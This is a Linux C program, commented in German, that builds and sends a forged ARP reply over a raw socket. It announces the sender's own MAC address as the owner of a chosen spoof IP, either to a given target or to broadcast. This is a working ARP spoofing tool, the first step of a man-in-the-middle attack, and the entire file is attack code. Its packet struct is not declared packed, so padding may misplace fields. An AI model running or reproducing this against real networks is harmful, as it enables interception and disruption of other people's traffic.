#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/if_packet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>

void print_mac(const unsigned char *mac){
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Format: "AA:BB:CC:DD:EE:FF"
int mac_aton(const char *mac_str, unsigned char *mac_bytes) {
    unsigned int values[6];
    int i;

    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return -1;
    }

    for (i = 0; i < 6; i++) {
        mac_bytes[i] = (unsigned char) values[i];
    }
    return 0;
}

struct arp_packet {
    struct ethhdr eth_header;
    struct arphdr arp_header;
    unsigned char sender_mac[ETH_ALEN];
    struct in_addr sender_ip;
    unsigned char target_mac[ETH_ALEN];
    struct in_addr target_ip;
};

int main(int argc, char *argv[])
{
    if (argc < 3 || argc > 4) {
        fprintf(stderr, "Usage: %s <target_ip> <spoof_ip> [target-mac]\n", argv[0]);
        exit(1);
    }

    const char* iface_name = "wlan0";
    const char* target_ip_str = argv[1];
    const char* spoof_ip_str = argv[2];

    int raw_sockfd;
    int ioctl_sockfd;
    struct ifreq if_idx;
    struct ifreq if_mac;

    unsigned char local_mac[ETH_ALEN];
    unsigned char target_mac_bytes[ETH_ALEN];
    unsigned char broadcast_mac_val[ETH_ALEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    if (argc == 4) {
        printf("Using provided target MAC: %s\n", argv[3]);
        if (mac_aton(argv[3], target_mac_bytes) != 0) {
            fprintf(stderr, "Error: Invalid target MAC address format. Use AA:BB:CC:DD:EE:FF\n");
            return 1;
        }
    } else {
        printf("Using Broadcast as target MAC address.\n");
        memcpy(target_mac_bytes, broadcast_mac_val, ETH_ALEN);
    }
    int if_index;

    ioctl_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (ioctl_sockfd == -1) {
        perror("ioctl_sockfd creation");
        return 1;
    }
    printf("ioctl Socket erstellt.\n");

    raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (raw_sockfd == -1) {
        perror("raw_sockfd creation");
        close(ioctl_sockfd);
        return 1;
    }
    printf("Raw Socket für ARP-Pakete erstellt.\n");

    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, iface_name, IFNAMSIZ - 1);
    if_idx.ifr_name[IFNAMSIZ - 1] = '\0';
    if (ioctl(ioctl_sockfd, SIOCGIFINDEX, &if_idx) == -1) {
        perror("SIOCGIFINDEX");
        close(ioctl_sockfd);
        close(raw_sockfd);
        return 1;
    }
    if_index = if_idx.ifr_ifindex; // Korrigiert
    printf("Interface: %s\nIndex: %d\n", iface_name, if_index);

    memset(&if_mac, 0, sizeof(struct ifreq));
    strncpy(if_mac.ifr_name, iface_name, IFNAMSIZ - 1);
    if_mac.ifr_name[IFNAMSIZ - 1] = '\0';
    if (ioctl(ioctl_sockfd, SIOCGIFHWADDR, &if_mac) == -1) {
        perror("SIOCGIFHWADDR");
        close(ioctl_sockfd);
        close(raw_sockfd);
        return 1;
    }
    memcpy(local_mac, if_mac.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("Eigene MAC-Adresse: ");
    print_mac(local_mac);

    close(ioctl_sockfd);
    printf("ioctl Socket geschlossen.\n");

    struct arp_packet arp_p;

    memcpy(arp_p.eth_header.h_dest, target_mac_bytes, ETH_ALEN);
    memcpy(arp_p.eth_header.h_source, local_mac, ETH_ALEN);
    arp_p.eth_header.h_proto = htons(ETH_P_ARP);

    printf("Ethernet-Header erstellt.\n");

    arp_p.arp_header.ar_hrd = htons(ARPHRD_ETHER);
    arp_p.arp_header.ar_pro = htons(ETH_P_IP);
    arp_p.arp_header.ar_hln = ETH_ALEN;
    arp_p.arp_header.ar_pln = sizeof(struct in_addr);
    arp_p.arp_header.ar_op = htons(ARPOP_REPLY);

    printf("ARP-Header erstellt.\n");

    memcpy(arp_p.sender_mac, local_mac, ETH_ALEN);
    arp_p.sender_ip.s_addr = inet_addr(spoof_ip_str);

    memcpy(arp_p.target_mac, target_mac_bytes, ETH_ALEN);
    arp_p.target_ip.s_addr = inet_addr(target_ip_str);

    printf("ARP-Payload gefüllt.\n");

    struct sockaddr_ll sa_ll;
    memset(&sa_ll, 0, sizeof(sa_ll));
    sa_ll.sll_family = AF_PACKET;
    sa_ll.sll_protocol = htons(ETH_P_ARP);
    sa_ll.sll_ifindex = if_index;
    sa_ll.sll_hatype = ARPHRD_ETHER;
    sa_ll.sll_pkttype = PACKET_OTHERHOST; // PACKET_OTHERHOST ist hier in Ordnung
    sa_ll.sll_halen = ETH_ALEN;
    memcpy(sa_ll.sll_addr, target_mac_bytes, ETH_ALEN);

    if (sendto(raw_sockfd, &arp_p, sizeof(struct arp_packet), 0,
               (struct sockaddr*)&sa_ll, sizeof(sa_ll)) == -1) {
        perror("sendto");
        close(raw_sockfd);
        return 1;
    }
    printf("ARP-Paket gesendet.\n");

    close(raw_sockfd);
    return 0;
}
